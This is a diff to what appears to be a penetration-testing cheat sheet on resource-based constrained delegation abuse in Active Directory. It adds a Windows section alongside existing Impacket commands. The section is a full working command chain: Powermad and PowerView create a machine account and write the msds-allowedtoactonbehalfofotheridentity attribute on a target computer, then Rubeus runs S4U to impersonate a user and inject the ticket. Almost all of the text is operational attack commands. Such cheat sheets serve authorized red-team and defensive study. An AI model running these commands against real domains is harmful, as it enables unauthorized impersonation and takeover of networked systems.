@@ -71,5 +71,34 @@ addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-ip <dc_ip> '
 rbcd.py -delegate-from 'rbcd$' -delegate-to '<target_computer>' -dc-ip <dc_ip> -action 'write' '<domain>/<user>:<password>
 getST.py -spn 'cifs/<target_computer>.<domain>' -impersonate <target_user> -dc-ip <dc_ip> '<domain>/rbcd$:rbcdpass'
 export KRB5CCNAME=<target_user>.ccache
-wmiexec.py -k -no-pass <target_computer>.>domain>
+wmiexec.py -k -no-pass <target_computer>.<domain>
+```
+
+### From Windows
+
+```bash
+Import-Module .\powermad.ps1
+Import-Module .\powerview.ps1
+
+$TargetComputer = "<target_computer>.<domain>"  
+$AttackerSID = Get-DomainUser <user> -Properties objectsid | Select -Expand objectsid  
+$ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}  
+ConvertFrom-SID $ACE.SecurityIdentifier  
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)  
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid  
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList  
+"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"  
+$SDBytes = New-Object byte[] ($SD.BinaryLength)  
+$SD.GetBinaryForm($SDBytes, 0)  
+Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}  
+$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-  
+allowedtoactonbehalfofotheridentity  
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+
+.\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:<domain>
+
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:harmj0y /msdsspn:cifs/<target_computer>.<domain> /ptt
+
+#Clean up
+Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
 ```
